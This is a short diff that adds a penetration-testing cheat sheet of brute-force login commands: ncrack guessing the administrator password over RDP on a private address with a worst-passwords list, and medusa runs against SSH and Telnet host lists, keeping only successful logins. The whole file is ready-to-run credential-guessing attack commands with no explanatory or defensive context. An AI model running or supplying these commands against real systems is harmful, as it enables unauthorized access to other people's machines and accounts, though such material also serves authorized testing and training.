@@ -1,0 +1,6 @@
+##RDP Brute##
+	ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
+##SSH Brute##
+	medusa -M ssh -C /usr/share/wordlists/ssh.lst -H 22.txt -T 10| grep SUCCESS |tee medusa-results.txt
+##Telnet Brute##
+	medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
